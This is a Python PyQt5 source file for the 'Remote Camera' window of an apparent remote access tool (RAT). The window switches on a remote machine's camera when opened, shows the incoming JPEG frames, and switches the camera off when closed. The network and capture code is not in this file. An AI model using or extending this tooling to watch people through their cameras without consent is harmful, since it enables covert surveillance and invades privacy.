import io

from PIL import Image
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QPixmap
from PyQt5.QtWidgets import QLabel, QVBoxLayout, QPushButton

from RATFunction.RATFunctionUI import RATFunctionUI
from RATFunction.RemoteCamera import RemoteCamera


class RemoteCameraUI(RATFunctionUI):
    def __init__(self, function: RemoteCamera, *args, **kwargs):
        super().__init__(function, *args, **kwargs)
        self.remote_camera_function = function
        self.remote_camera_function.received_image_callback = self.received_image_callback
        self.fixed_height = 594

        self.setWindowTitle('Remote Camera')

        # Create label and set pixmap
        self.label = QLabel()
        self.label.setFixedSize(1056, self.fixed_height)
        self.label.setScaledContents(True)
        self.pixmap = QPixmap()

        # Create layout and add label to it
        layout = QVBoxLayout()
        layout.addWidget(self.label)

        # Set the layout for the widget
        self.setLayout(layout)

    def show(self):
        super().show()
        self.remote_camera_function.send_set_state(True)

    def closeEvent(self, event):
        self.remote_camera_function.send_set_state(False)
        event.accept()

    def received_image_callback(self, image_bytes):
        image = Image.open(io.BytesIO(image_bytes))
        width, height = image.size

        QPixmap.loadFromData(self.pixmap, image_bytes, format='JPEG')
        self.label.setPixmap(self.pixmap)

        self.label.setFixedSize(int(self.fixed_height * width / height), self.fixed_height)
        self.adjustSize()
